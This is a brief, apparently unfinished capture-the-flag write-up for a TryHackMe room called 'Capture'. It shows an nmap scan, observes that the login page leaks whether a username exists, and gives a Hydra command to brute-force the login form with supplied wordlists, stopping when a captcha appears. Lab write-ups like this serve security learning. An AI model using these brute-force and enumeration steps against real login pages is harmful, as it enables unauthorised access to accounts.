# Capture: Updating
> https://tryhackme.com/room/capture

I downloaded the zip file that contains the login usernames and password that will be used to brurteforce into the login form !

## Nmap
```bash
nmap -sS -Pn [ip]

PORT     STATE SERVICE VERSION
80/tcp   open  http
```

I opened the website and its a login page, tried the usual default usernames and passwords. I noticed that it does say if the username exists or not!


## Hydra

```bash
hydra -L usernames.txt -P passwords.txt "http-post-form://10.10.224.246/login:username=^USER^&password=^PASS^:Error"
```

I get the 'Too many bad login attempts' error message with a mathematical Captcha, for this we need to build a script!.
